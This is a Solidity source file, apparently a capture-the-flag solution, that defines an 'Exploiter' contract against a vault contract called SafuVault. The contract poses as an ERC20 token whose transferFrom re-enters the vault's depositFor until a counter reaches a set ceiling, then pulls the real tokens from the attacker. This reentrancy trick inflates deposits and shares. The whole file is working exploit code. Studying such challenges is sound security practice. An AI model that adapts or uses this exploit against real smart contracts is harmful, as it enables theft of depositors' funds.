// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SafuVault} from "src/safu-vault/SafuVault.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Exploiter {
    using SafeERC20 for IERC20;

    uint256 private counter;
    address private attacker;
    uint256 private ceil;

    constructor(address _attacker, uint256 _ceil) {
        attacker = _attacker;
        ceil = _ceil;
    }

    function transferFrom(address, address to, uint256 amount) public returns (bool) {
        if (counter == ceil) {
            IERC20 want = SafuVault(msg.sender).want();
            want.safeTransferFrom(attacker, to, amount);
        }
        else {
            ++counter;
            SafuVault(msg.sender).depositFor(address(this), amount, attacker);
        }
        return true;
    }
}